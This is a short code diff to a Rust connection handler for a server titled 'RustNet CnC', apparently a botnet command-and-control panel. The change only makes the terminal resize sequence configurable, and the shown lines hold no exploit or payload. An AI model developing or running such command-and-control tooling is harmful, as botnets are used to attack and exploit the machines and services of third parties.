@@ -79,7 +79,10 @@ pub async fn handle_user_connection(conn: TcpStream, addr: String, state: Arc<Ap
     }
     
     let title = set_title("☾☼☽ RustNet CnC");
-    let resize_sequence = "\x1b[8;32;120t";
+    
+    let width = state.config.read().await.terminal_width;
+    let height = state.config.read().await.terminal_height;
+    let resize_sequence = format!("\x1b[8;{};{}t", height, width);
     
     let handshake_timeout = Duration::from_secs(state.config.read().await.handshake_timeout_secs);
     let magic_string = state.config.read().await.login_magic_string.clone();
